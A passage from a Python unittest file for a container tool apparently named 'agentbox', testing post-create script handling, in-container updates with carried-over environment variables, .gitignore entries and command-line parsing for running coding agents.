        self._write(cfg.PROJECT_POST_CREATE, "echo hi\n")
        self.assertEqual(cfg.post_create_command(self.workspace), cfg.PROJECT_POST_CREATE_COMMAND)

    def test_a_project_that_provisions_itself_is_not_guessed_at(self) -> None:
        self._write(cfg.PROJECT_CONFIG)
        self.assertIsNone(cfg.post_create_command(self.workspace))

    def test_update_execs_the_script_in_the_running_box(self) -> None:
        code, called, _ = self._update()
        self.assertEqual(code, 0)
        self.assertIn("exec", called)
        self.assertEqual(called[-2], "-c")
        self.assertTrue(called[-1].endswith(cfg.POST_CREATE))

    def test_update_carries_the_current_lists_into_an_older_box(self) -> None:
        self._write(cfg.LOCAL_OVERRIDE, '{"containerEnv": {"AGENTBOX_SKILLS": "a b"}}')
        _, called, _ = self._update()
        self.assertTrue(called[-1].endswith(f"AGENTBOX_SKILLS='a b' {cfg.POST_CREATE}"))
        self.assertIn("AGENTBOX_BUN_AGENTS=@oh-my-pi/pi-coding-agent", called[-1])

    def test_a_config_without_the_variables_leaves_the_box_env_alone(self) -> None:
        self.assertEqual(cli.with_env(cfg.POST_CREATE, {}), cfg.POST_CREATE)

    def test_update_refuses_rather_than_guess(self) -> None:
        self._write(cfg.PROJECT_CONFIG)
        code, called, output = self._update()
        self.assertEqual(code, 8)
        self.assertEqual(called, [])
        self.assertIn("agentbox up --rebuild", output)


class TestGitignoreEntries(unittest.TestCase):
    def test_custom_workspace_files_are_ignored_the_default_is_not(self) -> None:
        self.assertEqual(
            cli.missing_gitignore_entries(""),
            [cfg.MERGED_IN_PROJECT, "*.code-workspace", "!default.code-workspace"],
        )

    def test_present_entries_are_not_repeated(self) -> None:
        existing = f"{cfg.MERGED_IN_PROJECT}\n*.code-workspace\n"
        self.assertEqual(cli.missing_gitignore_entries(existing), ["!default.code-workspace"])

    def test_a_substring_match_does_not_count_as_present(self) -> None:
        self.assertIn("*.code-workspace", cli.missing_gitignore_entries("custom.code-workspace\n"))


class TestParser(unittest.TestCase):
    def test_run_keeps_agent_flags(self) -> None:
        args = cli.build_parser().parse_args(["run", "claude", "--dangerously-skip-permissions"])
        self.assertEqual(args.subcommand, "run")
        self.assertEqual(args.command, ["claude", "--dangerously-skip-permissions"])

    def test_code_takes_an_optional_workspace_name(self) -> None:
        self.assertIsNone(cli.build_parser().parse_args(["code"]).name)
        self.assertEqual(cli.build_parser().parse_args(["code", "custom"]).name, "custom")

    def test_up_defaults_to_current_directory(self) -> None:
        args = cli.build_parser().parse_args(["up"])
        self.assertEqual(args.workspace, Path.cwd())
        self.assertFalse(args.rebuild)


if __name__ == "__main__":
    unittest.main()
